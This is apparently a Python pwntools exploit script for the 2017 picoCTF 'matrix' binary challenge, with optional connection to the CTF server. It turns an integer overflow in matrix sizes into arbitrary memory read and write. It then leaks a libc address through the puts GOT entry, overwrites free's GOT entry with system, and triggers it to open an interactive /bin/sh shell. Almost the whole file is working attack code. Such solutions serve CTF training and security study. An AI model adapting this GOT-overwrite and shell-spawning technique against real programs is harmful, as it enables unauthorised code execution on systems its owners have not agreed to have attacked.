#!/usr/bin/python
# vim: set fileencoding=utf-8 :
import argparse

import bitstring
from pwn import *

# Context
context.binary = './matrix'

#######################
# Variables générales, ne dépendent pas de l'environnement
#######################
MATRIX_0_ROWS = 10
MATRIX_0_COLS = 8
ROWS = 2143289344


def create_matrix(process, rows, cols):
    process.readuntil("Enter command:")
    process.sendline("create " + str(rows) + " " + str(cols))


def call_set(process, matrix_id, row, col, value):
    process.readuntil("Enter command:")
    process.sendline("set " + str(matrix_id) + " " + str(row) + " " + str(col) + " " + str(value))


def call_get(process, matrix_id, row, col):
    process.readuntil("Enter command:")
    process.sendline("get " + str(matrix_id) + " " + str(row) + " " + str(col))
    process.readuntil(" = ")
    float_value = p.readline()
    log.debug("float value = %s", float_value)
    value = bitstring.BitArray(float=float(float_value), length=32).int
    log.debug("value = 0x%08x", value)
    return value


def write_on_matrix0(process, bits, row, col):
    if col == 9:
        log.error("Unable to write here !")
    log.debug("Writing %s on matrix 0, row %i, col %i", bits.hex, row, col)
    call_set(process, 0, row, col, bits.floatle)


def prepare_matrix1(process):
    create_matrix(process, 1, 1)
    row_bin_value = bitstring.BitArray(int=2147483647, length=32).bin
    col_bin_value = bitstring.BitArray(int=2147483647, length=32).bin
    row_value = bitstring.BitArray(bin=row_bin_value)
    write_on_matrix0(process, row_value, MATRIX_0_COLS, 2)
    col_value = bitstring.BitArray(bin=col_bin_value)
    write_on_matrix0(process, col_value, MATRIX_0_COLS, 3)


def write_on_matrix1(process, value, address, start_matrix_1):
    diff = ((address + 0xffffffff - start_matrix_1) % 0xffffffff) / 4
    row = int(math.floor(diff / ROWS))
    col = int(diff - (row * ROWS) + 1)
    log.debug("Writing 0x%08x on 0x%08x = matrix 1, rows %i, cols %i", value, address, row, col)
    value_to_write = bitstring.BitArray(hex="{0:#08x}".format(value)).floatbe
    call_set(process, 1, row, col, value_to_write)


def get_matrix_1_start(process):
    return call_get(process, 0, MATRIX_0_COLS, 4)


def read_from_matrix1(p, address, start_matrix_1):
    diff = ((address + 0xffffffff - start_matrix_1) % 0xffffffff) / 4
    row = int(math.floor(diff / ROWS))
    col = int(diff - (row * ROWS) + 1)
    log.debug("Reading value from address 0x%08x = matrix 1, rows %i, cols %i", address, row, col)
    return call_get(p, 1, row, col)


#################################
# 3 : call system /bin/sh
#################################
def call_system(p):
    p.readuntil("Enter command:")
    p.sendline("destroy 0")
    p.interactive()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Exploit the bins.')
    parser.add_argument('--dbg', '-d', action="store_true")
    parser.add_argument('--remote', '-r', action="store_true")
    args = parser.parse_args()

    #################################
    # Connection
    ################################

    log.info("Calling vulnerable program")

    if args.remote:
        p = remote('shell2017.picoctf.com', 37838)
        matrix = ELF("./matrix")
        libc = ELF("./remote.libc.so.6")  # libc6-amd64_2.19-0ubuntu6_i386 retrieved from server
    else:
        p = process(["./matrix"])
        matrix = ELF("./matrix")
        libc = ELF("/lib/i386-linux-gnu/libc.so.6")  # libc6_2.19-0ubuntu6.11_amd64 from my computer

    # SYSTEM = 0xf7e3f310
    FREE_GOT = matrix.got['free']
    PUTS_GOT = matrix.got['puts']
    PUTS_LIBC_OFFSET = libc.symbols['puts']
    SYSTEM_LIBC_OFFSET = libc.symbols['system']

    if args.dbg and not args.remote:
        gdb.attach(p, """
        b *handle_get+77
        b *handle_destroy
        c
        """)
        log.setLevel('debug')

    #log.setLevel('debug')

    # Initializing matrix 0
    create_matrix(p, MATRIX_0_ROWS, MATRIX_0_COLS)
    log.info("1 - Writing \"/bin/sh\" on matrix 0")
    write_on_matrix0(p, bitstring.BitArray(bytearray(b'/bin')), 0, 0)
    write_on_matrix0(p, bitstring.BitArray(bytearray(b'/sh\00')), 0, 1)

    log.info("2 - Get Matrix 1 address")
    prepare_matrix1(p)
    start_matrix_1 = get_matrix_1_start(p)
    log.success("Retrieved matrix_1_start_address: 0x%08x", start_matrix_1)

    log.info("3 - Leak libc base address")
    # Je sais pas pourquoi j'ai un nombre négatif, mais la formule ci-dessous marche...
    puts_address = 0xffffffff + read_from_matrix1(p, PUTS_GOT, start_matrix_1) + 1
    log.debug("puts address: 0x%08x", puts_address)
    log.debug("PUTS_LIBC_OFFSET : 0x%08x", PUTS_LIBC_OFFSET)
    log.debug("SYSTEM_LIBC_OFFSET: 0x%08x", SYSTEM_LIBC_OFFSET)
    system_libc_address = puts_address - PUTS_LIBC_OFFSET + SYSTEM_LIBC_OFFSET
    log.success("system_libc_address: 0x%08x", system_libc_address)

    log.info("4 - update free 0x%08x with system 0x%08x", FREE_GOT, system_libc_address)
    write_on_matrix1(p, system_libc_address, FREE_GOT, start_matrix_1)

    log.info("5 - calling /bin/sh (previously free) with handle_destroy")
    call_system(p)

    if args.dbg and not args.remote:
        p.sendline("get 0 0 0")
        p.interactive()

    if args.dbg and args.remote:
        p.sendline("get 0 0 0")
        p.interactive()
